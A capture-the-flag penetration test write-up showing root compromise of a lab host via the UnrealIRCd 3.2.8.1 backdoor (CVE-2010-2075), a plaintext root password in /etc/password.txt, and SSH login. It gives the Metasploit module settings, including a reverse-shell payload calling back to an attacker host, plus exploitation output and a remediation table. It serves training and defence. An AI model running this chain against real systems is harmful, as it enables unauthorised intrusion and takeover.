# Write-Up — UnrealIRCd Backdoor to Root via Misplaced Credentials

> **Type:** Network / Service Penetration Test
> **Target:** `10.130.166.242` (`irc.pentest-target.thm`)
> **Tools:** Nmap, searchsploit, Metasploit, SSH
> **Final Result:** Root access via UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) chained with a plaintext root password left on disk

---

## 1. Introduction

The target is a Linux server running an outdated **UnrealIRCd 3.2.8.1** instance. The objective was to gain a foothold on the machine and escalate privileges to `root`.

This box illustrates two classic findings:

- A **supply-chain backdoor** in a publicly released service binary.
- A **post-exploitation gift** — credentials left in plaintext on the filesystem.

Neither is exotic, both are still seen in the wild.

---

## 2. Reconnaissance

### 2.1 Port Scan — Nmap

```bash
nmap -sV -sC -oN scan.txt 10.130.166.242
```

Result:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.5) |
| 6667/tcp | IRC | **UnrealIRCd 3.2.8.1** |

Relevant scan output:

```
6667/tcp open  irc     UnrealIRCd
| irc-info:
|   server: irc.pentest-target.thm
|   version: Unreal3.2.8.1. irc.pentest-target.thm
```

Two observations:

1. **OpenSSH 9.6p1** is recent — not a realistic attack surface without credentials.
2. **UnrealIRCd 3.2.8.1** is a major red flag. This exact version is **infamous** for shipping with a backdoor in 2010.

---

## 3. Vulnerability Analysis

### 3.1 Offline Search — searchsploit

```bash
searchsploit UnrealIRC | grep "Remote Downloader/Execute"
```

Result:

```
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute   |  linux/remote/13853.pl
```

### 3.2 The Vulnerability — CVE-2010-2075

Between **November 2009 and June 2010**, the official UnrealIRCd 3.2.8.1 source tarball distributed on the project's mirrors was **trojanised**. The malicious build accepts a magic string in a specially crafted command, which then passes attacker-controlled input directly to `system()` — yielding **pre-authenticated remote code execution**.

- **CVE:** CVE-2010-2075
- **Type:** Backdoor in distributed source code
- **Authentication:** None required
- **Impact:** Arbitrary command execution as the user running ircd

A Metasploit module exists and is reliable.

---

## 4. Initial Access

### 4.1 Launching Metasploit

```bash
msfconsole
search unrealircd
```

```
   #  Name                                        Disclosure  Rank       Check
   -  ----                                        ----------  ----       -----
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12  excellent  Yes
```

### 4.2 Module Configuration

```
use 0
set RHOSTS 10.130.166.242
set payload cmd/unix/reverse
set LHOST 192.168.145.108
set LPORT 443
show options
```

Why these choices:

- `cmd/unix/reverse` — lightweight, no compiled stager required; works on any minimal *nix shell.
- `LPORT 443` — blends in with HTTPS-style egress on filtered networks.

### 4.3 Exploitation

```
exploit
```

Output:

```
[*] Started reverse TCP double handler on 192.168.145.108:443
[*] 10.130.166.242:6667 - Connected to 10.130.166.242:6667
[*] 10.130.166.242:6667 - Sending IRC backdoor command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened
   (192.168.145.108:443 -> 10.130.166.242:52696)

whoami
webmaster
```

Foothold obtained as the **`webmaster`** user.

### 4.4 User Flag

```bash
cat /home/webmaster/flag.txt
```

```
THM{Pwned-Y0ur-First-Machine}
```

> **Severity: Critical.** Unauthenticated RCE on an internet-facing service.

---

## 5. Post-Exploitation & Privilege Escalation

### 5.1 Quick Enumeration

The first move on any new shell is a sweep for obvious wins — interesting files, SUID binaries, kernel version, cron jobs, sudo rights. Here, a single grep for password-related files paid off:

```bash
find / -name "password*" 2>/dev/null
```

Among the results:

```
/etc/password.txt
```

That filename is **not standard** (`/etc/passwd` is — `/etc/password.txt` is not). Worth checking immediately.

### 5.2 Reading the File

```bash
cat /etc/password.txt
```

```
root:PDLrCVl1pLD91U0JMmCz
```

A **plaintext root credential**, world-readable, sitting in `/etc/`. This is either an admin leftover from initial provisioning, a sloppy backup, or a CTF gift — in real engagements, all three happen.

### 5.3 Pivoting to SSH

We already know from the initial scan that **OpenSSH is exposed on port 22**. Rather than trying to escalate locally from the `webmaster` shell, we pivot:

```bash
ssh root@10.130.166.242
# password: PDLrCVl1pLD91U0JMmCz
```

Direct root login succeeds — meaning `PermitRootLogin yes` is set in `sshd_config`, another finding worth flagging.

### 5.4 Root Flag

```bash
root@pentest-target:~# cat /root/flag.txt
THM{Escalat1on-D0ne}
```

Full compromise achieved.

---

## 6. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ UnrealIRCd 3.2.8.1 detected ]
       │
       ▼
[ searchsploit / Metasploit module identified ]
       │
       ▼
[ Pre-auth RCE via backdoored ircd ]
       │  → Shell as 'webmaster'
       ▼
[ Filesystem enumeration ]
       │  → /etc/password.txt discovered
       ▼
[ Plaintext root credential extracted ]
       │
       ▼
[ SSH login as root with PermitRootLogin enabled ]
       │
       ▼
[ Full system compromise ]
```

**Lesson:** The initial breach came from an outdated and notoriously backdoored service. The privilege escalation came from human error (credentials on disk). The two are unrelated in nature but combined cleanly into a full takeover.

---

## 7. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|-------------|
| 1 | UnrealIRCd 3.2.8.1 — backdoored release (CVE-2010-2075) | **Critical** | Decommission the IRC service if not needed. If required, migrate to a **maintained IRCd** (InspIRCd, ngIRCd, or UnrealIRCd 6.x). Establish a patch-management process and subscribe to security advisories for every internet-facing service. Verify the integrity of source tarballs (PGP signatures, checksums) on every install. |
| 2 | Plaintext root password stored at `/etc/password.txt` | **Critical** | Never store credentials in cleartext on disk. Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, Bitwarden, etc.). If a credential must exist on disk transiently, restrict permissions (`chmod 600`, root-owned), encrypt it (`gpg`, `age`), and delete it as soon as the provisioning task completes. Audit `/etc/`, `/root/`, `/home/`, and `/tmp/` for stale credential files. |
| 3 | `PermitRootLogin yes` enabled in `sshd_config` | **High** | Set `PermitRootLogin no` (or `prohibit-password` at minimum). Use a non-root sudoer for administrative access. Enforce **SSH key authentication only** (`PasswordAuthentication no`). Configure `fail2ban` or equivalent to throttle brute-force attempts. |
| 4 | Internet-exposed IRC service on a non-IRC server | **Medium** | If the IRC daemon is not part of the business function, **remove it entirely**. Reduce the attack surface — only services strictly required for operations should be exposed. Apply firewall rules to restrict access by source IP or VPN. |
| 5 | Outdated service version exposed in banner | **Low** | Suppress or generalise service banners where possible. Banner suppression is defense in depth — not a primary control — but slows down automated scanners and reduces reconnaissance value. |

---

## 8. Conclusion

This box is a compact reminder of two principles that show up in nearly every real engagement:

1. **Patch hygiene matters more than zero-days.** The UnrealIRCd backdoor has been public since 2010. A working Metasploit module has existed for over a decade. Any host still running 3.2.8.1 is offering free RCE to anyone with a port scanner.
2. **Privilege escalation often isn't an exploit — it's a mistake.** No kernel CVE, no SUID trickery, no race condition. Just a file someone left behind. Post-exploitation enumeration finds these constantly: `.bash_history`, config backups, cron scripts, Git directories, world-readable secrets.

In both cases, the fix is operational discipline, not new technology.
